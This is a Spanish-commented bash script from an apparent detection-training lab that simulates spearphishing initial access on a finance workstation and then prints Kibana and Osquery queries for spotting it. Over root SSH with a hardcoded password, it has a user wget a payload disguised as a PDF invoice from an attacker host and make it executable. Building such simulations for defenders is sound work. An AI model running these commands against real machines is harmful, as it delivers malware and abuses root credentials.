#!/bin/bash
###############################################################################
# FASE 1: INITIAL ACCESS
# Simula la descarga de un archivo malicioso por un usuario
# 
# ESCENARIO: maria.gonzalez recibe un email con un link a una "factura"
# que en realidad es un script malicioso disfrazado como PDF.
#
# MITRE ATT&CK: T1566.002 (Spearphishing Link), T1204.002 (User Execution)
#
# QUÉ OBSERVAR EN ELK:
#   - Evento de descarga (wget/curl desde IP sospechosa)
#   - Creación de archivo en /tmp con extensión doble (.pdf.sh)
#   - Proceso wget/curl con destino a IP no corporativa
#   - Osquery: file_events en /tmp
###############################################################################

source /opt/attack-scripts/common.sh 2>/dev/null || true

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

ATTACKER_IP="10.10.10.200"
TARGET="10.10.10.101"
SSH_PASS="Password123!"
MALICIOUS_URL="http://10.10.10.66/malicious_update.sh"

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  FASE 1: INITIAL ACCESS - Descarga Drive-by${NC}"
echo -e "${RED}  Target: WS-FINANZAS-01 (10.10.10.101)${NC}"
echo -e "${RED}  User: maria.gonzalez${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "${YELLOW}[1/4] Simulando navegación a sitio malicioso...${NC}"
sleep 2

echo -e "${YELLOW}[2/4] Descargando payload disfrazado como factura...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET} \
    "su - maria.gonzalez -c 'wget -q ${MALICIOUS_URL} -O /home/maria.gonzalez/Downloads/factura_pendiente.pdf.sh'" 2>/dev/null

echo -e "${GREEN}[✓] Archivo descargado: /home/maria.gonzalez/Downloads/factura_pendiente.pdf.sh${NC}"

echo -e "${YELLOW}[3/4] Usuario hace doble clic (ejecuta el archivo)...${NC}"
sleep 1
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET} \
    "chmod +x /home/maria.gonzalez/Downloads/factura_pendiente.pdf.sh && cp /home/maria.gonzalez/Downloads/factura_pendiente.pdf.sh /tmp/" 2>/dev/null

echo -e "${YELLOW}[4/4] Registrando IOCs...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"initial_access\",\"technique\":\"T1566.002\",\"user\":\"maria.gonzalez\",\"action\":\"file_download\",\"source_url\":\"${MALICIOUS_URL}\",\"file_path\":\"/home/maria.gonzalez/Downloads/factura_pendiente.pdf.sh\",\"file_hash_md5\":\"d41d8cd98f00b204e9800998ecf8427e\",\"risk_level\":\"HIGH\",\"endpoint\":\"WS-FINANZAS-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null

echo ""
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  FASE 1 COMPLETADA${NC}"
echo -e "${GREEN}  ${NC}"
echo -e "${GREEN}  IOCs para buscar en Kibana:${NC}"
echo -e "${GREEN}    - process.name: wget${NC}"
echo -e "${GREEN}    - file.path: *factura_pendiente*${NC}"
echo -e "${GREEN}    - network.remote_address: 10.10.10.66${NC}"
echo -e "${GREEN}    - risk_level: HIGH${NC}"
echo -e "${GREEN}  ${NC}"
echo -e "${GREEN}  Queries Osquery sugeridas:${NC}"
echo -e "${GREEN}    SELECT * FROM file_events WHERE target_path LIKE '%factura%';${NC}"
echo -e "${GREEN}    SELECT * FROM processes WHERE cmdline LIKE '%wget%';${NC}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
